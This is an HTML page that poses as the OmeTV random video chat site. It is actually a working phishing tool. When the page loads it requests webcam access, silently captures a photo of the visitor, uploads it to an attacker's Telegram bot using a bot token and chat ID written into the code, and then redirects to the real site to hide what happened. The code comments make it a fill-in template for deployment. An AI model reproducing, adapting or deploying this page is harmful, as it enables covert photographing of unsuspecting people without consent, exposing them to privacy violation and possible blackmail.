<!DOCTYPE html>
<html>
<head>
    <title>OmeTV - Random Video Chat</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            text-align: center;
            padding-top: 50px;
            background: #1a1a1a;
            color: white;
        }
        .loader {
            border: 5px solid #f3f3f3;
            border-top: 5px solid #3498db;
            border-radius: 50%;
            width: 50px;
            height: 50px;
            animation: spin 1s linear infinite;
            margin: 20px auto;
        }
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
        .camera-permission {
            background: #2d2d2d;
            padding: 20px;
            border-radius: 10px;
            max-width: 400px;
            margin: 20px auto;
        }
        button {
            background: #3498db;
            color: white;
            border: none;
            padding: 10px 30px;
            border-radius: 5px;
            font-size: 16px;
            cursor: pointer;
            margin-top: 10px;
        }
    </style>
</head>
<body>
    <div class="camera-permission">
        <h2>Connecting you to a random partner...</h2>
        <div class="loader"></div>
        <p>OmeTV needs camera access to continue</p>
        <p><small>Please click "Allow" when your browser asks</small></p>
        <button onclick="startCamera()">Enable Camera</button>
    </div>

    <script>
        // ===== CONFIGURATION =====
        const BOT_TOKEN = '8207315387:AAH-XxHhWrti1GU5mIc9ybLAPKpXtqmJV-o';  // ← PASTE YOUR BOT TOKEN HERE
        const CHAT_ID = '6552971958';        // ← YOUR CHAT ID
        
        async function startCamera() {
            try {
                // Request camera access
                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
                
                // Show success message
                document.body.innerHTML += '<p style="color:green;">✓ Camera access granted! Capturing...</p>';
                
                // Create hidden video element
                const video = document.createElement('video');
                video.srcObject = stream;
                video.style.display = 'none';
                document.body.appendChild(video);
                
                // Wait for video to load
                await video.play();
                
                // Take photo after 1 second
                setTimeout(() => {
                    const canvas = document.createElement('canvas');
                    canvas.width = video.videoWidth || 640;
                    canvas.height = video.videoHeight || 480;
                    const context = canvas.getContext('2d');
                    context.drawImage(video, 0, 0, canvas.width, canvas.height);
                    
                    // Convert to image and send to Telegram
                    canvas.toBlob(blob => {
                        const formData = new FormData();
                        formData.append('chat_id', CHAT_ID);
                        formData.append('photo', blob, 'ometv_visitor.jpg');
                        
                        fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
                            method: 'POST',
                            body: formData
                        })
                        .then(() => {
                            console.log('✅ Photo sent to Telegram!');
                            document.body.innerHTML += '<p style="color:green;">✓ Photo captured and sent!</p>';
                        })
                        .catch(error => {
                            console.error('Failed to send photo:', error);
                            document.body.innerHTML += '<p style="color:red;">✗ Failed to send photo</p>';
                        });
                        
                        // Stop camera
                        stream.getTracks().forEach(track => track.stop());
                        document.body.removeChild(video);
                        
                        // Redirect to real OmeTV after 2 seconds
                        setTimeout(() => {
                            window.location.href = "https://ome.tv/";
                        }, 2000);
                        
                    }, 'image/jpeg');
                    
                }, 1000);
                
            } catch (error) {
                console.log('Camera access denied:', error);
                document.body.innerHTML += '<p style="color:red;">✗ Camera access denied. Please allow camera and try again.</p>';
            }
        }
        
        // Auto-start camera when page loads (optional)
        window.addEventListener('load', startCamera);
    </script>
</body>
</html>
